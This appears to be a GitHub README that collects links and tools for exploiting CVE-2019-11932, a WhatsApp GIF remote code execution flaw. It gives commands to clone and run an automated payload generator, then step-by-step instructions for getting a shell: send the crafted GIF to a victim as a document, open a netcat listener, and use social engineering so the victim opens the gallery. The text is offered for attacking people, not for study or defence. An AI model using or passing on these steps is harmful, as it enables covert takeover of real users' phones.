# whatsapp_rce
whatsapp remote code execution

CVE-2019-11932
https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/

Full Android App: https://github.com/valbrux/CVE-2019-11932-SupportApp

All creditts goes to  awakened and valbrux


CVE-2019-11932-SupportApp

This native code file aims to be complementary to the published Whatsapp GIF RCE exploit by Awakened , by calculating the system() function address and ROP gadget address for different types of devices, which then can be used to successfully exploit the vulnerability.

Demo

https://drive.google.com/file/d/1T-v5XG8yQuiPojeMpOAG6UGr2TYpocIj/view

Google Drive link to download if the above link is not accessible https://drive.google.com/open?id=1X9nBlf5oj5ef2UoYGOfusjxAiow8nKEK



#??????????????????????????????????????????????????????????????????????????
About Start.sh Script by KeepWannabe for automated Exploit

# WhatsRCE
This is a Automated Generate Payload for CVE-2019-11932 (WhatsApp Remote Code Execution)

1. Auto install GCC (no harm command, you can see this is open-source)
2. Saving to **.GIF** file

## How To Use ?
```
sudo apt install git
git clone https://github.com/KeepWannabe/WhatsRCE
cd WhatsRCE && bash start.sh
```

## How Get Shell ?

1. You just send the **.GIF** file to victim user **AS A DOCUMENT NOT IMAGES**
2. And set the nc / netcat to port you set on the WhatsRCE tools {**nc -lnvp your_port**}
3. You can use the Social Engineering attack so that victims can be attracted to launch this exploit
4. tell the victim to open the gallery via whatsapp and send the victim to send any photos (no need, it's just got to the gallery no problem) after that a few seconds later you will receive a shell connection from the victim





############# Mine contribution is Zero, But i enjoyed their works #######################
